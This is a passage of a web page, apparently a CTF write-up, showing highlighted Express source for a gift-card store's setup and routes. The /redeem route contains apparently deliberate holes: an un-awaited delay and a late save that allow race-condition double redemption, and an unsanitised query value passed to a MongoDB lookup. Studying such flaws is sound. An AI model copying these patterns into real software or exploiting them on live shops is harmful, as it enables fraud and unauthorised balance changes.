            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Product with productId: </span><span class="p">${</span><span class="nx">productData</span><span class="p">.</span><span class="nx">productId</span><span class="p">}</span><span class="s2"> already exists.`</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Insert randomly generated Discount Codes if they don't exist</span>
    <span class="kd">const</span> <span class="nx">createDiscountCodes</span> <span class="o">=</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">discountCodes</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">{</span> <span class="na">discountCode</span><span class="p">:</span> <span class="nf">generateDiscountCode</span><span class="p">(),</span> <span class="na">value</span><span class="p">:</span> <span class="mi">20</span> <span class="p">}</span>
        <span class="p">];</span>

        <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">code</span> <span class="k">of</span> <span class="nx">discountCodes</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">existingCode</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">DiscountCodes</span><span class="p">.</span><span class="nf">findOne</span><span class="p">({</span> <span class="na">discountCode</span><span class="p">:</span> <span class="nx">code</span><span class="p">.</span><span class="nx">discountCode</span> <span class="p">});</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">existingCode</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">await</span> <span class="nx">DiscountCodes</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Inserted discount code: </span><span class="p">${</span><span class="nx">code</span><span class="p">.</span><span class="nx">discountCode</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="s2">`Discount code </span><span class="p">${</span><span class="nx">code</span><span class="p">.</span><span class="nx">discountCode</span><span class="p">}</span><span class="s2"> already exists.`</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">};</span>

    <span class="c1">// Call function to insert discount codes</span>
    <span class="k">await</span> <span class="nf">createDiscountCodes</span><span class="p">();</span>

    <span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nf">accepts</span><span class="p">(</span><span class="dl">'</span><span class="s1">html</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nf">accepts</span><span class="p">(</span><span class="dl">'</span><span class="s1">json</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">notfound</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="k">return</span> <span class="nx">app</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">DB</span><span class="p">,</span> <span class="nx">App</span> <span class="p">};</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>

<details id="routejs">
  <summary>route.js</summary>

  <div file="route.js" class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="route.js"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">isAuth</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">passport</span><span class="p">.</span><span class="nf">authenticate</span><span class="p">(</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">session</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">failureRedirect</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/user-login</span><span class="dl">'</span> <span class="p">})(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)}</span>
<span class="kd">const</span> <span class="nx">JWT</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="nx">express</span><span class="p">.</span><span class="nc">Router</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">passport</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">passport</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">UserProducts</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/userproduct</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">const</span> <span class="nx">Product</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/product</span><span class="dl">'</span><span class="p">);</span> 
<span class="kd">const</span> <span class="nx">User</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/user</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">DiscountCodes</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../models/discountCodes</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="p">{</span> <span class="na">v4</span><span class="p">:</span> <span class="nx">uuidv4</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">uuid</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">let</span> <span class="nx">delay</span> <span class="o">=</span> <span class="mf">1.5</span><span class="p">;</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/store</span><span class="dl">'</span><span class="p">,</span> <span class="nx">isAuth</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">try</span><span class="p">{</span>
        <span class="kd">const</span> <span class="nx">all</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Product</span><span class="p">.</span><span class="nf">find</span><span class="p">()</span>
        <span class="kd">const</span> <span class="nx">products</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">p</span> <span class="k">of</span> <span class="nx">all</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">products</span><span class="p">.</span><span class="nf">push</span><span class="p">({</span> <span class="na">productId</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">productId</span><span class="p">,</span> <span class="na">Name</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="na">Description</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Description</span><span class="p">,</span> <span class="na">Cost</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Cost</span> <span class="p">})</span>
        <span class="p">}</span>
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">store</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">Balance</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span><span class="p">,</span> <span class="na">Product</span><span class="p">:</span> <span class="nx">products</span><span class="p">})</span>
    <span class="p">}</span> <span class="k">catch</span><span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Error during request</span><span class="dl">'</span> <span class="p">})</span>
    <span class="p">}</span>
<span class="p">})</span>


<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/redeem</span><span class="dl">'</span><span class="p">,</span> <span class="nx">isAuth</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">User not found</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// Now handle the DiscountCode (Gift Card)</span>
        <span class="kd">let</span> <span class="p">{</span> <span class="nx">discountCode</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
        
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">discountCode</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Discount code is required!</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">discount</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">DiscountCodes</span><span class="p">.</span><span class="nf">findOne</span><span class="p">({</span><span class="nx">discountCode</span><span class="p">})</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">discount</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Invalid discount code!</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// Check if the voucher has already been redeemed today</span>
        <span class="kd">const</span> <span class="nx">today</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">lastRedemption</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">lastVoucherRedemption</span><span class="p">;</span>

        <span class="k">if </span><span class="p">(</span><span class="nx">lastRedemption</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">isSameDay</span> <span class="o">=</span> <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getFullYear</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getFullYear</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
                              <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getMonth</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getMonth</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
                              <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getDate</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getDate</span><span class="p">();</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">isSameDay</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">You have already redeemed your gift card today!</span><span class="dl">'</span> <span class="p">});</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// Apply the gift card value to the user's balance</span>
        <span class="kd">const</span> <span class="p">{</span> <span class="nx">Balance</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">).</span><span class="nf">select</span><span class="p">(</span><span class="dl">'</span><span class="s1">Balance</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="o">=</span> <span class="nx">Balance</span> <span class="o">+</span> <span class="nx">discount</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
        <span class="c1">// Introduce a slight delay to ensure proper logging of the transaction </span>
        <span class="c1">// and prevent potential database write collisions in high-load scenarios.</span>
        <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">delay</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">));</span>
        <span class="nx">user</span><span class="p">.</span><span class="nx">lastVoucherRedemption</span> <span class="o">=</span> <span class="nx">today</span><span class="p">;</span>
        <span class="k">await</span> <span class="nx">user</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span>

        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span>
            <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
            <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Gift card redeemed successfully! New Balance: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="c1">// Send success message</span>
        <span class="p">});</span>

    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error during gift card redemption:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Error redeeming gift card</span><span class="dl">'</span><span class="p">});</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/redeemVoucher</span><span class="dl">'</span><span class="p">,</span> <span class="nx">isAuth</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">redeemVoucher</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">Balance</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="p">})</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/register-user</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">register-user</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/register-user</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="p">{</span> <span class="nx">username</span> <span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">username</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">password</span> <span class="o">==</span> <span class="kc">null</span><span class="p">){</span>
        <span class="k">return</span> <span class="nf">next</span><span class="p">({</span><span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">})</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">username</span> <span class="o">||</span> <span class="o">!</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">You forgot to enter your credentials!</span><span class="dl">'</span> <span class="p">})</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Please choose a longer password.. :-(</span><span class="dl">'</span> <span class="p">})</span>
    <span class="p">}</span>

    <span class="nx">User</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="k">new</span> <span class="nc">User</span><span class="p">({</span> <span class="nx">username</span> <span class="p">}),</span> <span class="nx">password</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">err</span> <span class="o">&amp;&amp;</span> <span class="nx">err</span><span class="p">.</span><span class="nf">toString</span><span class="p">().</span><span class="nf">includes</span><span class="p">(</span><span class="dl">'</span><span class="s1">registered</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Username taken</span><span class="dl">'</span> <span class="p">})</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Error during registration</span><span class="dl">'</span> <span class="p">})</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">jwtoken</span> <span class="o">=</span> <span class="nx">JWT</span><span class="p">.</span><span class="nf">sign</span><span class="p">({</span><span class="na">userId</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">_id</span><span class="p">},</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">JWT_SECRET</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">,</span><span class="na">expiresIn</span><span class="p">:</span> <span class="dl">'</span><span class="s1">10h</span><span class="dl">'</span><span class="p">})</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">,</span> <span class="nx">jwtoken</span><span class="p">,</span> <span class="p">{</span> <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span> <span class="p">})</span>

        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Account registered.</span><span class="dl">'</span><span class="p">})</span>
    <span class="p">})</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user-login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">user-login</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user-login</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">passport</span><span class="p">.</span><span class="nf">authenticate</span><span class="p">(</span><span class="dl">'</span><span class="s1">user-local</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">_</span><span class="p">,</span> <span class="nx">user</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Error during login</span><span class="dl">'</span> <span class="p">})</span>
        <span class="p">}</span>

        <span class="kd">const</span> <span class="nx">jwtoken</span> <span class="o">=</span> <span class="nx">JWT</span><span class="p">.</span><span class="nf">sign</span><span class="p">({</span><span class="na">userId</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">_id</span><span class="p">},</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">JWT_SECRET</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">,</span><span class="na">expiresIn</span><span class="p">:</span> <span class="dl">'</span><span class="s1">10h</span><span class="dl">'</span><span class="p">})</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">cookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">,</span> <span class="nx">jwtoken</span><span class="p">,</span> <span class="p">{</span> <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span> <span class="p">})</span>

        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span>
            <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
            <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Logged</span><span class="dl">'</span>
        <span class="p">})</span>
    <span class="p">})(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user-logout</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">clearCookie</span><span class="p">(</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="kd">function</span> <span class="nf">parseCost</span><span class="p">(</span><span class="nx">cost</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">cost</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">free</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">const</span> <span class="nx">match</span> <span class="o">=</span> <span class="nx">cost</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">\d</span><span class="sr">+/</span><span class="p">);</span> <span class="c1">// Extract numbers from the string</span>
    <span class="k">return</span> <span class="nx">match</span> <span class="p">?</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">match</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">10</span><span class="p">)</span> <span class="p">:</span> <span class="kc">NaN</span><span class="p">;</span> <span class="c1">// Return the number or NaN if not found</span>
<span class="p">}</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/store</span><span class="dl">'</span><span class="p">,</span> <span class="nx">isAuth</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">productId</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">productId</span><span class="p">;</span>

    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">productId</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">productId is required.</span><span class="dl">'</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="c1">// Find the product by Name</span>
        <span class="kd">const</span> <span class="nx">all</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Product</span><span class="p">.</span><span class="nf">find</span><span class="p">()</span>
